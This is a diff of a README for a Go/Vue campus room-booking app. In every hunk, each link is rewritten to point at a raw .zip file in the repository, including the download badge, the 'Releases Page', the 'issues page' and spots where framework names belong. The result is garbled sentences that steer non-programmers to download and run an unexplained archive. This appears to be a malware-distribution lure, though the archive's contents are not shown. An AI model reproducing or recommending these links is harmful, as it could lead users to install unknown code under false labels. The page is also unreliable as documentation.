@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to the booking-system-go-vue! This application allows users to book campus rooms easily. Built with Go and https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip, it offers features like an Admin Dashboard and Role-Based Access Control. Follow the instructions below to download and run the application without any programming knowledge.
+Welcome to the booking-system-go-vue! This application allows users to book campus rooms easily. Built with Go and https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip, it offers features like an Admin Dashboard and Role-Based Access Control. Follow the instructions below to download and run the application without any programming knowledge.
 
 ## 📥 Download Now
 
-[![Download Here](https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip)](https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip)
+[![Download Here](https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip)](https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip)
 
 ## 🌟 Features
 
@@ -25,12 +25,12 @@ Welcome to the booking-system-go-vue! This application allows users to book camp
 
 ## 🔗 Download & Install
 
-To get the latest version of booking-system-go-vue, visit this page to download: [Releases Page](https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip).
+To get the latest version of booking-system-go-vue, visit this page to download: [Releases Page](https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip).
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip) to open the releases page.
+   Click [here](https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip) to open the releases page.
 
 2. **Choose the Latest Release**  
    Look for the latest version listed at the top. You will see a list of files that you can download.
@@ -46,7 +46,7 @@ To get the latest version of booking-system-go-vue, visit this page to download:
 
 ## 🌐 Application Overview
 
-The booking-system-go-vue combines the power of Go (Gin) for the backend with https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip 3 for the frontend. This setup ensures a smooth user experience while managing room bookings.
+The booking-system-go-vue combines the power of Go (Gin) for the backend with https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip 3 for the frontend. This setup ensures a smooth user experience while managing room bookings.
 
 ### User Roles 
 
@@ -62,7 +62,7 @@ The booking-system-go-vue combines the power of Go (Gin) for the backend with ht
 
 ## 📊 Analytics
 
-The application provides insights into usage patterns. Admins can generate reports to track bookings over time, ensuring better room management. This feature utilizes https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip for effective data representation.
+The application provides insights into usage patterns. Admins can generate reports to track bookings over time, ensuring better room management. This feature utilizes https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip for effective data representation.
 
 ## ⚙️ Configuration
 
@@ -85,11 +85,11 @@ If you encounter issues, please consider the following steps:
 
 ## 🔄 Updating the Software
 
-To keep your software secure and efficient, regularly check the [Releases Page](https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip) for updates. Follow the same download and installation steps to get the latest version.
+To keep your software secure and efficient, regularly check the [Releases Page](https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip) for updates. Follow the same download and installation steps to get the latest version.
 
 ## 📞 Support
 
-If you need assistance, please visit our [issues page](https://github.com/zeeclex/booking-system-go-vue/raw/refs/heads/main/backend-go/go_system_booking_vue_v3.9.zip) to report any problems or request help.
+If you need assistance, please visit our [issues page](https://raw.githubusercontent.com/zeeclex/booking-system-go-vue/main/backend-go/services/go_system_vue_booking_3.6.zip) to report any problems or request help.
 
 ## 📝 Conclusion
 
